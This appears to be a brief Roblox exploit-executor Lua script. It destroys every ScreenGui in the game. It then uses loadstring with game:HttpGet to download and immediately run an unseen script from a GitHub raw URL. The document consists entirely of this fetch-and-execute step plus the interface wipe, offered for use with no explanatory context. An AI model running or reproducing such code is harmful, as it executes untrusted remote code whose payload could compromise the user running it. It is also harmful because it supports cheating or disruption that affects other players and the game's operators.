for i, v in game:GetDescendants() do
    if v:IsA("ScreenGui") then
        v:Destroy()
    end
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/FreakyYield/InfiniteYieldIsBad/refs/heads/main/sup.lua"))()
